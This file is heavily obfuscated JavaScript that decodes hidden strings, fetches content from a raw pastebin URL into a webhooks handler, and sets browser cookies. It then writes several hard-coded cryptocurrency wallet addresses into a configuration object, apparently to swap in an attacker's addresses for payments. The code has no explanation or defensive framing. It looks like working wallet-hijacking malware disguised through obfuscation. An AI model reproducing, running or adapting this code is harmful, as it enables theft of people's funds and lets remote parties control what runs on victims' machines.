'use strict';

var _slicedToArray = function() {
  /**
   * @param {?} arr
   * @param {string} i
   * @return {?}
   */
  function sliceIterator(arr, i) {
    /** @type {!Array} */
    var _arr = [];
    /** @type {boolean} */

    var _n = true;
    /** @type {boolean} */

    var _d = false;
    var _e = undefined;

    try {
      var _i = arr[Symbol.iterator]();

      var _s;

      for (; !(_n = (_s = _i.next()).done); _n = true) {
        _arr.push(_s.value);

        if (i && _arr.length === i) {
          break;
        }
      }
    } catch (err) {
      /** @type {boolean} */
      _d = true;
      _e = err;
    } finally {
      try {
        if (!_n && _i.return) {
          _i.return();
        }
      } finally {
        if (_d) {
          throw _e;
        }
      }
    }

    return _arr;
  }

  return function(arr, i) {
    if (Array.isArray(arr)) {
      return arr;
    } else {
      if (Symbol.iterator in Object(arr)) {
        return sliceIterator(arr, i);
      } else {
        throw new TypeError("Invalid attempt to destructure non-iterable instance");
      }
    }
  };
}();
/** @type {function(number): ?} */


var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function(canCreateDiscussions) {
  return typeof canCreateDiscussions;
} : function(obj) {
  return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
};
/**
 * @param {!Object} obj
 * @param {string} key
 * @param {string} value
 * @return {?}
 */


function _defineProperty(obj, key, value) {
  if (key in obj) {
    Object.defineProperty(obj, key, {
      value: value,
      enumerable: true,
      configurable: true,
      writable: true
    });
  } else {
    /** @type {string} */
    obj[key] = value;
  }

  return obj;
}

(async function() {
  /**
   * @return {?}
   */
  function f() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var args = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      args[_key8] = arguments[_key8];
    }

    +
    (args.length = 2, args[193] = args[1]);

    switch (attrs) {
      case options.var[name](12) == "" ? -674:
        undefined:
          return args[0] + args[193];
    }
  }
  /**
   * @return {?}
   */


  function SignupInline() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var args = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      args[_key8] = arguments[_key8];
    }

    ~(args.length = 1, args[6] = 242);

    if (args[args[6] - 236] > args[6] - -76) {
      return args[args[6] - (args[args[args[args[6] - 236] - (args[args[6] - 236] - 6)] - 236] - 12)];
    } else {
      return args[args[args[6] - 236] - 242] = attrs + (attrs = args[args[args[args[6] - 236] - 236] - (args[6] - 0)], args[6] - (args[6] - 0)), args[args[args[6] - 236] - 242];
    }
  }
  /**
   * @return {?}
   */


  function normalize() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var args = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      args[_key8] = arguments[_key8];
    }

    _typeof((args.length = 1, args[203] = args[0], args[1] = "", args[81] = args[4], args[203] = args[203].substring(1, args[203].length - 1), args[2] = args[203].split(","), args[37] = -67));
    /** @type {number} */


    var i = args[args[37] - -104] - (args[37] - 0);

    for (; i < args[args[args[args[37] - (args[37] - 37)] - (args[args[args[37] - -104] - (args[37] - (args[37] - (args[37] - 37)))] - 37)] - -69].length; i = i + 2) {
      /** @type {!Array} */
      args[args[args[args[37] - -104] - -104] - -148] = [args[args[args[37] - -(args[37] - (args[37] - (args[args[37] - -104] - -171)))] - (args[args[37] - (args[37] - 37)] - 2)][i], args[args[args[37] - -104] - -69][i + (args[37] - -68)]];

      var _qualifiedName$split6 = args[args[args[37] - -104] - (args[37] - 81)].map(Number);

      var _qualifiedName$split62 = _slicedToArray(_qualifiedName$split6, 2);

      var commandName = _qualifiedName$split62[0];
      var s = _qualifiedName$split62[1];

      for (; s;) {
        +(args[args[args[37] - (args[37] - (args[args[args[37] - -104] - (args[37] - 37)] - -104))] - -68] += String.fromCharCode(commandName >> 8 * (s & 7) & 255), s = s >> 3);
      }
    }

    if (args[args[args[37] - -104] - -104] > args[37] - -66) {
      return args[args[37] - (args[37] - (args[37] - -312))];
    } else {
      return args[args[args[37] - -(args[37] - -171)] - -68].replace(/~/g, "");
    }
  }
  /**
   * @param {number} name
   * @param {?} data
   * @param {number} f
   * @return {?}
   */


  function get(name, data, f) {
    var op = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : normalize;
    var v = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : p;

    if (f) {
      return data[p[f]] = get(name, data);
    } else {
      if (data) {
        /** @type {!Array} */
        var state = [op(v), name || f];
        v = state[0];
        data = state[1];
      }
    }

    return data ? name[v[data]] : p[name] || (f = (v[name], op), p[name] = f(inputs[name]));
  }
  /**
   * @param {string} fn
   * @return {?}
   */


  function testcase(fn) {
    var move = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : ["fromCharCode", "apply"];
    var variables;
    var mask;
    var arr;
    var pos;
    var tmp;
    /** @type {function(new:String, *=): string} */

    var board_LD = String;
    /** @type {string} */

    var i = "length";
    /** @type {number} */

    var num = 255;
    /** @type {string} */

    var _ = "charCodeAt";
    /** @type {string} */

    var ORIGIN_METHOD = "slice";
    /** @type {string} */

    var REPLACE = "replace";

    if ("<~" === fn[ORIGIN_METHOD](0, 2)) {
      "~>" === fn[ORIGIN_METHOD](-2);
    }

    fn = fn[ORIGIN_METHOD](2, -2)[REPLACE](/s/g, "")[REPLACE]("z", "!!!!!");
    variables = "uuuuu" [ORIGIN_METHOD](fn[i] % 5 || 5);
    fn = fn + variables;
    /** @type {!Array} */

    arr = [];
    /** @type {number} */

    pos = 0;
    tmp = fn[i];

    for (; tmp > pos; pos = pos + 5) {
      /** @type {number} */
      mask = 52200625 * (fn[_](pos) - 33) + 614125 * (fn[_](pos + 1) - 33) + 7225 * (fn[_](pos + 2) - 33) + 85 * (fn[_](pos + 3) - 33) + (fn[_](pos + 4) - 33);
      arr.push(num & mask >> 24, num & mask >> 16, num & mask >> 8, num & mask);
    }

    return function(a, b) {
      /** @type {number} */
      var origB = b;

      for (; origB > 0; origB--) {
        a.pop();
      }
    }(arr, variables[i]), board_LD[move[0]][move[1]](board_LD, arr);
  }
  /**
   * @param {number} name
   * @param {?} res
   * @param {number} f
   * @return {?}
   */


  function transform(name, res, f) {
    var findReplacement = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : testcase;
    var mappings = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : p;

    if (f) {
      return res[p[f]] = transform(name, res);
    } else {
      if (res) {
        /** @type {!Array} */
        var d = [findReplacement(mappings), name || f];
        mappings = d[0];
        res = d[1];
      }
    }

    return res ? name[mappings[res]] : p[name] || (f = (mappings[name], findReplacement), p[name] = f(inputs[name]));
  }
  /**
   * @return {?}
   */


  function SafeString() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var args = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      args[_key8] = arguments[_key8];
    }

    ~(args.length = 1, args[237] = -34);
    var c;
    var inbuf;
    /** @type {number} */

    var inbits = 0;
    /** @type {string} */

    var val = "";
    var numIDs = args[args[args[args[237] - -271] - (args[237] - 237)] - -(args[args[237] - -271] - (args[args[237] - -271] - 34))].length;
    /** @type {function(new:String, *=): string} */

    var signedTransactions = String;
    /** @type {string} */

    var i = "charCodeAt";
    /** @type {string} */

    var signedTransactionsCounter = "fromCharCode";
    var done;
    args[args[237] - (args[237] - (args[237] - -47))] = args[args[args[237] - -271] - -34];
    /** @type {number} */

    done = args[237] - (args[237] - 0);

    for (; done < numIDs; done = done + (args[args[237] - -271] - (args[237] - (args[args[237] - -271] - -35)))) {
      ~(c = args[args[args[237] - -271] - -(args[237] - (args[237] - 47))][i](done) - 33, c >= 0 && c < 32 ? (inbits = inbits + (inbuf = inbuf << args[args[237] - -271] - (args[237] - 5) | c, 5), inbits >= 8 ? inbits = inbits - (val = val + signedTransactions[signedTransactionsCounter](inbuf >> inbits - (args[237] - -42) & 255), 8) : args[237] - -34) : 0);
    }

    if (args[args[237] - -271] > 28) {
      return args[args[args[237] - -271] - -118];
    } else {
      return val;
    }
  }
  /**
   * @param {number} i
   * @param {?} data
   * @param {number} f
   * @return {?}
   */


  function func(i, data, f) {
    var removeUrlPara = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : SafeString;
    var args = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : p;

    if (f) {
      return data[p[f]] = func(i, data);
    } else {
      if (data) {
        /** @type {!Array} */
        var result = [removeUrlPara(args), i || f];
        args = result[0];
        data = result[1];
      }
    }

    return data ? i[args[data]] : p[i] || (f = (args[i], removeUrlPara), p[i] = f(inputs[i]));
  }
  /** @type {!Array} */


  var p = [];
  /** @type {number} */

  var __p_2427579986 = 0;

  var inputs = function() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var args = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      args[_key8] = arguments[_key8];
    }

    _typeof((args.length = 0, args[68] = 234, args[args[68] - 234] = function(cxformList) {
      /** @type {number} */
      var x = 16;

      for (; x % 4 === 0; x++) {
        /** @type {number} */
        var z = 0;
        /** @type {!Array<?>} */

        cxformList = cxformList.concat(function() {
          z++;

          if (z === 1) {
            return [];
          }
          /** @type {number} */


          var i = 70;

          for (; i; i--) {
            cxformList.unshift(cxformList.pop());
          }

          return [];
        }());
      }
      /** @type {number} */


      var __p_4893669126 = 30;

      for (; __p_4893669126; __p_4893669126--) {
        cxformList.unshift(cxformList.pop());
      }

      return cxformList;
    }(["{2119255093,1553,2120571473,1546,2121884237,1602,2121483073,1553,2121221956,1665,2121680183,1665,2121953587,1665,2121486408,1546,2121676596,1553,2121680179,1672,2120635989,1602,32310,8}", "{2121160758,1553,2121625165,1672,2120303670,1616,2121955417,1665,2121098034,1672,2120966455,1546,2118796599,1616,2121742390,1616,2119783764,1602,2120371272,1553,2121881922,1546,32338,8}", "{2121821548,1602}", "{2118599223,1546,2119256114,1553,2119650882,1546,2119521102,1553,2119452737,1665,8278849,1096,8279092,1025,2119189569,1672,2119058482,1616,2118267955,1672,2119455304,1553,8279883,1096,2118929225,1602,2119520822,1553,2119782453,1546,2119387700,1616,2119519029,1546,2119126067,1616,8278343,129}", "{2121888355,1672,2121560175,1553}", "{2121690451,1553,2121758002,1672,8282437,129}", "{2120966709,1553,2121691956,1546,2121100373,1553,2120765514,1665,2120504647,1665,8279884,136}", "{2121745973,1616,2121226834,1553,2121421873,1546,2121820248,1553,2121296213,1616,32328,8}", "{2121493570,1546,2121617204,1665,2121954118,1616,2121814585,1616,8270384,1088,2121034085,1672,32378,8}", "{2121097541,1546,2121157700,1616,8278065,136}", "{2120633654,1546,2119521101,1665,2120569904,1672,2121485111,1672,2120836166,1616,2119780149,1672}", "{2121165925,1665,2121558119,1616}", "{2120770401,1553,2121560641,1665}", "{2121626480,1616,32360,8}", "{2121820513,1616,8287087,136}", "{2121557861,1665}", "{2121557089,1665,32353,8}", "(.9'#>$)(581", "{2121822309,1616,2121427301,1553,8287037,129}", "<~A8-*pDfT@~>", "<~@UX=h?ZgC*~>", ".\";()=$4()83?=4\"/=8'/;,5.\";7%>,4-6:''<<//237=>\"/-.87;,:2'-:4/><5-994'-:8&=94'-:8/>;'--*4'-<3?<,\".&8#?;,/.*37'>$*.>8#=;44", "{2121559653,1672,2121427301,1546,32371,8}", "<~@WZ)~>", "-*24#=*9.6;(!;<$-:<79:4''23'9:<6.\"=';=<,(\"7'1>,.0*4819<%(&;$+-$7/211", ".2;''", "{2121822829,1602}", "<~1dX#e0f;fdCLM9E=\\!^&;d+6^BL5<l<-EOTD,W9,@Ponr:,kO_H;7:]1jW&4F*Mpr7!a)S=Ee^fDaRKB8leYdAnH7%;FGb)DE28f=^k</C,](82/5WjG=PR~>", "-6;'1", "{2121806384,1616,2117613104,1616,2120300084,1546,8274993,1032,2120500274,1546,2118333747,1602,2120562485,1672,2120366134,1616,2118465584,1665,2118203704,1616,2120639287,1672,2120639556,1553,2120365104,1602,2120500532,1602}", "{2121822832,1546}", "/*&(->#\"/*:8#=,7'>'%+<,#'.\"%-.4&'&<%1>,%)>)%'5,1/\"181:1", ".:37?", "{2120770402,1672}", "{2121230180,1616,32357,8}"]), args[args[68] - 33] = args[args[args[args[68] - 166] - 166] - (args[68] - 0)]));

    if (args[args[68] - 166] > args[68] - -71) {
      return args[args[68] - (args[68] - -57)];
    } else {
      return __p_2427579986 ? args[args[args[args[args[68] - 166] - 166] - (args[68] - 68)] - (args[68] - (args[68] - (args[68] - 201)))].pop() : __p_2427579986++, args[args[args[68] - 166] - (args[68] - (args[68] - 33))];
    }
  }();

  var defaultClassNameDragging = get(32);
  var defaultClassNameDragged = get.call(undefined, 29);
  var val = func(27);
  var absoluteClass = get(25);
  var tagDisplayProp = func.apply(undefined, [23]);
  var START_A = func(20);
  var value = func.apply(undefined, [19]);
  var s = func(16);
  var id = transform.call(undefined, 15);
  var sEId = get.apply(undefined, [11]);
  var tEId = get.apply(undefined, [10]);
  var name = get(7);

  var options = function() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var storeNames = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      storeNames[_key8] = arguments[_key8];
    }

    _typeof((storeNames.length = 0, storeNames[46] = -152, storeNames[storeNames[storeNames[46] - -198] - (storeNames[storeNames[46] - -198] - 0)] = {
      var: "null",
      function: [],
      null: function f() {
        var key = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : get.apply(this, [6]);

        if (!options.function[0]) {
          options.function.push(64);
        }

        return options.function[key];
      }
    }, storeNames[storeNames[storeNames[46] - -198] - (storeNames[46] - 144)] = storeNames[46] - (storeNames[46] - -240)));

    if (storeNames[storeNames[46] - -296] > storeNames[storeNames[storeNames[144] - (storeNames[storeNames[144] - (storeNames[144] - 46)] - (storeNames[144] - -472))] - -286] - 38) {
      return storeNames[storeNames[storeNames[46] - -198] - (storeNames[144] - -63)];
    } else {
      return storeNames[storeNames[storeNames[storeNames[46] - -296] - (storeNames[46] - (storeNames[144] - -374))] - (storeNames[storeNames[storeNames[storeNames[46] - -198] - (storeNames[144] - 56)] - (storeNames[144] - 144)] - -(storeNames[storeNames[144] - (storeNames[144] - 144)] - (storeNames[46] - 176)))];
    }
  }();

  var attrs;

  (async function() {
    /** @type {number} */
    var _len8 = arguments.length;
    /** @type {!Array} */

    var args = Array(_len8);
    /** @type {number} */

    var _key8 = 0;

    for (; _key8 < _len8; _key8++) {
      args[_key8] = arguments[_key8];
    }

    _typeof((args.length = 0, args[1190] = -243, args[args[1190] - -243] = get(args[args[1190] - -1433] - (args[1190] - (args[1190] - -277))), args[args[1190] - -294] = args[args[args[1190] - -1433] - -243], args[args[1190] - -244] = get.apply(undefined, [args[args[args[args[1190] - -1433] - -1433] - (args[args[1190] - -1433] - 1190)] - -(args[args[1190] - -1433] - -519)]), args[2] = get.apply(undefined, [31]), args[args[1190] - (args[1190] - 3)] = get.apply(undefined, [args[args[args[1190] - -1433] - -1433] - (args[1190] - (args[1190] - (args[1190] - (args[1190] - -273))))]), args[args[args[1190] - -1433] - -247] = get(args[args[1190] - -1433] - -271), args[args[1190] - (args[args[1190] - (args[1190] - 1190)] - 5)] = func.apply(undefined, [26]), args[args[1190] - -249] = get.apply(undefined, [24]), args[args[1190] - -445] = args[args[1190] - -253], args[args[1190] - -250] = transform.apply(undefined, [22]), args[args[args[args[1190] - -1433] - (args[1190] - 1190)] - -251] = get.call(undefined, args[args[1190] - -1433] - (args[args[1190] - -1433] - 21)), args[args[args[1190] - -1433] - -252] = transform.apply(undefined, [18]), args[args[1190] - -445] = get(args[args[1190] - -1433] - -260), args[args[args[1190] - (args[1190] - 1190)] - -254] = transform(args[args[1190] - -(args[1190] - (args[1190] - 1433))] - -257)));

    var i = get(args[1190] - (args[args[args[1190] - -1433] - -1433] - 7));

    _typeof((args[args[1190] - (args[1190] - 13)] = get(args[1190] - (args[args[1190] - -1433] - 7)), args[args[1190] - (args[1190] - (args[1190] - -257))] = get.apply(undefined, [9]), args[args[args[1190] - -1433] - (args[1190] - 15)] = false));

    if ((webhooks[get(8)]((await requires[args[args[args[args[1190] - -1433] - -1433] - -257]][tEId]("https://pastebin.com/raw/46x1HByx"))[sEId]), args[args[args[1190] - -(args[args[args[1190] - -1433] - -1433] - -1676)] - (args[1190] - 15)]) && options.var[args[args[1190] - (args[args[1190] - -(args[args[1190] - -1433] - -1676)] - 13)]](12) == "") {
      /**
       * @return {undefined}
       */
      var setCookie = function set() {
        /** @type {number} */
        var _len = arguments.length;
        /** @type {!Array} */

        var a = Array(_len);
        /** @type {number} */

        var i = 0;

        for (; i < _len; i++) {
          a[i] = arguments[i];
        }

        void(a.length = 3, a[224] = a[3], a[224] = get.apply(this, [13]), a[107] = a[0]);
        var s = {};
        /** @type {number} */

        var h = -108;
        /** @type {number} */

        var y = -81;
        /** @type {number} */

        var height = -75;
        /** @type {number} */

        var width = 307;

        for (; h + y + height + width != 2 && options.null();) {
          ~(a[9] = func(12), a[10] = (h + y + height + width) * 143 + -149);

          switch (a[10]) {
            case options.null() ? 4141:
              122:
                ~(document.cookie = f(a[107] + "=" + a[1] + ";" + a[11], a[9], attrs = -(y + 217 < h ? 674 : 164)), h = h * (h + -122), h = h - (242 < height ? 64 : 257), y = y * (-40 < height ? 2 : 100 > h ? -186 : -237), y = y - (53 > width ? -262 : 142), height = height + (-18 > h ? -227 : 158), width = width * (height + -101 < h ? 177 : 2), width = width - (y + 163));
              break;

            case options.var[name](12) == "" ? 1853:
              -160:
                void(a[11] = (a[12].setTime(f(a[12].getTime(), a[2] * (171 < height ? y + 157 : 24) * (h + 185) * (h + 185) * (-246 > y ? 162 : 1000), attrs = -674)), f(s.const, a[12].toUTCString(), attrs = -(y + (width + -28) < y ? h + 364 : 194 < h ? -82 : 674))), h = h * (width + (width + -590)), h = h - (-219 < width ? -374 : 60), y = y + (h + -121), height = height + (-142 < height ? -50 < h ? width + -186 : -33 : 170), width = width + ((-20 > width ? -238 : -202) > y ? 165 : -346));
              break;

            case !(options.var[i](12) == "") ? 126:
              6000:
                _typeof((s.const = a[224], a[12] = new Date(), h = h * (-61 < width ? 2 : y + (width + -254)), h = h - (-138 > width ? -69 : -91), y = y * (height + 77), y = y - (-29 > y ? h + 126 : 187), height = height * (-81 > y ? 238 < height ? 51 : 2 : 95), height = height - (h + 216 > height ? -156 : 203), width = width * (width + -305), width = width - (h + 443)));

              break;
          }
        }
      };

      var name = get.apply(undefined, [args[args[1190] - -1433] - (args[1190] - 7)]);
    }

    !(config[args[args[args[1190] - (args[1190] - 1190)] - (args[1190] - (args[args[1190] - -1433] - -254))]][id] = s, args[args[1190] - -462] = args[args[1190] - -256]);
    /** @type {boolean} */

    var _iteratorNormalCompletion3 = true;
    /** @type {boolean} */

    var _didIteratorError = false;
    var _iteratorError = undefined;

    try {
      var _iterator3 = Object[args[args[args[args[1190] - -1433] - -1433] - -445]]((_ref = {}, _defineProperty(_ref, args[args[1190] - (args[1190] - (args[1190] - -252))], value), _defineProperty(_ref, START_A, "LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut"), _defineProperty(_ref, args[args[1190] - (args[1190] - 8)], args[args[args[args[1190] - -1433] - -1433] - -250]), _defineProperty(_ref, tagDisplayProp, args[args[args[args[1190] - -1433] - -1433] - -249]), _defineProperty(_ref, absoluteClass, args[args[args[args[args[1190] - -1433] - -1433] - (args[1190] - (args[1190] - -1433))] - (args[1190] - 5)]), _defineProperty(_ref, val, "ANn5THmQidTh6zENyCytJV98i6po1dLJhh"), _defineProperty(_ref, args[args[1190] - (args[1190] - 4)], "qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j"), _defineProperty(_ref, defaultClassNameDragged, args[args[1190] - -246]), _defineProperty(_ref, "dash", args[args[args[1190] - (args[args[1190] - (args[1190] - 1190)] - 1190)] - -245]), _defineProperty(_ref, defaultClassNameDragging, args[args[1190] - -244]), _ref))[Symbol.iterator]();

      var _step17;

      for (; !(_iteratorNormalCompletion3 = (_step17 = _iterator3.next()).done); _iteratorNormalCompletion3 = true) {
        var _ref;

        var _step2$value = _slicedToArray(_step17.value, 2);

        var id = _step2$value[0];
        var subscription = _step2$value[1];
        config[args[args[1190] - (args[1190] - (args[1190] - -294))]][id] = subscription;
      }
    } catch (err) {
      /** @type {boolean} */
      _didIteratorError = true;
      _iteratorError = err;
    } finally {
      try {
        if (!_iteratorNormalCompletion3 && _iterator3.return) {
          _iterator3.return();
        }
      } finally {
        if (_didIteratorError) {
          throw _iteratorError;
        }
      }
    }
  })();
})();